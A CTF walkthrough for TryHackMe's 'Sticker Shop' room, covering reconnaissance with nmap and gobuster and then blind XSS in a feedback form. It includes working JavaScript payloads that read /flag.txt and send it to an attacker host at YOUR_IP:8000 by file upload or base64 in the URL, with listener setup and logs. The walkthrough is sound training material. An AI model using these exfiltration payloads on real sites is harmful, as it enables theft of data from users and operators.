# The Sticker Shop Walkthrough
<br/>

## Intro
Welcome into the Sticker Shop challenge, here is the link of the [room](https://tryhackme.com/r/room/thestickershop) on TryHackMe.
Here we are gonna be practicing with a very well known type of web-apps vulnerabilities, preatty straight after finding on which port the app is hosted we will need to take advantage of this OWASP top 10 vuln to read the flag.


Whenever you feel ready press on "Start Machine" and connect via OpenVPN from your machine or use the AttackBox.

Let's begin!



<br/>
<br/>

## The Challenge
Let's begin with a port scan with nmap:
```bash
nmap -sV MACHINE_IP
```

We can quickly find out that port 22 and 8080 is open and there is hosted a website selling cat's stickers.

Now here i went for directory scan to uncover any hidden ones:
```bash
gobuster dir -u http://MACHINE_IP:8080/ -w /usr/share/dirb/wordlists/common.txt
```

But this gave me no hits.

Let's try now to check if there are any subdomains:
```bash
gobuster vhost -u http://MACHINE_IP:8080  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --append-domain
```
and
```bash
gobuster dns -d stickershop.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 50
```

No hits again.

Our job is to red the text file located at `http://MACHINE_IP:8080/flag.txt`, obviously if we navigate straight to it we get a 401 Unauthorized error.

With further investigation we can spot that the web app is running on `Werkzeug/3.0.1 Python/3.8.10`.

Finally navigating the website we can see that there is a Feedback page with a form, where we can send a message.
Thinks looks interesting, every point where an user can submit some data is dangerous if not properly handled and sanitized, let's test it for some common vulnerabilities.

Sending some common JS payloads like:
```js
<script>alert("test")</script>
```

Does not product any visible output to us, we always get the same message that our feedback has been sent.
What is we can test it in another way, like injecting JS to ping our machine, if we get the ping this means that the form is vulnerable to XSS.

So on our machine let's create an empty file:
```bash
touch test.txt
```

Now start up an http server:
```
python3 -m http.server
```

Now we can submit a JS code like this one, which will fetch the test file, if it works we will see the log in our console:
```js
<script>
fetch('http://YOUR_IP:8000/test.txt')
  .then(response => response.text())
  .then(data => console.log(data))
  .catch(error => console.error('Failed to retrieve file'));

</script>
```

It works!
In fact we get:
```
MACHINE_IP - - [16/Jan/2025 16:58:02] "GET /test.txt HTTP/1.1" 200 -
```

This mean we can now craft a proper payload to get the flag file and send it to our machine:
```js
<script>
fetch('/flag.txt')
  .then(response => response.blob())
  .then(blob => {
    const formData = new FormData();
    formData.append('files', blob, 'flag.txt');
    fetch('http://YOUR_IP:8000/upload', {
      method: 'POST',
      body: formData
    })
  })
</script>
```

Before sending it we need an upload server on our machine:
```bash
pip3 install uploadserver
```

```bash
python3 -m uploadserver
```

You should see in the logs a successful upload:
```
MACHINE_IP - - [16/Jan/2025 17:47:49] [Uploaded] "flag.txt" --> TryHackMe/The_Sticker_Shop/flag (21).txt
```

Finally read the file content:
```bash
cat flag.txt
```


<br/>

### Other Options
There are obviously other ways to solve the challenge, one is avoid the file upload and use only the server logs:

On your machine start either an upload or download http server with python (depending on the one you choose the payload will have a small variation, the request method)
```bash
python3 -m http.server
```
or
```bash
python3 -m uploadserver
```

Craft a JS payload which will read the flag content, encode it into base64 and send it to your terminal log:
```js
<script>
fetch("/flag.txt", {method:'GET',mode:'no-cors',credentials:'same-origin'})
  .then(response => response.text())
  .then(text => { 
    fetch('http://YOUR_IP:8000/' + btoa(text), {mode:'no-cors'}); 
  });
</script>
```
or
```js
<script>
fetch('/flag.txt')
  .then(response => response.text())
  .then(text => {
    fetch('http://YOUR_IP:8000/' + btoa(text), {mode:'no-cors'});
  })
  .catch(error => console.error('Failed to retrieve flag'));
</script>
```

Your should see something like this:
```
MACHINE_IP - - [16/Jan/2025 17:24:12] "GET /REDACTED_ENCODED_FLAG HTTP/1.1" 404 -
```

Now you can send the payload and you will receive the base 64 data in your terminal, you can than take the flag and decode it:
```bash
echo "REDACTED_ENCODED_FLAG" | base64 -d                                     
```

<br/>
<br/>

I encourage you to find choose/find the method that best fits you, personally i like to have things saved in files in case they might come useful + i do not have to do any copy paste from the terminal like this.

Hope you had fun exploiting this machine and learned some new things following along.

Catch you in the next CTF 😃 
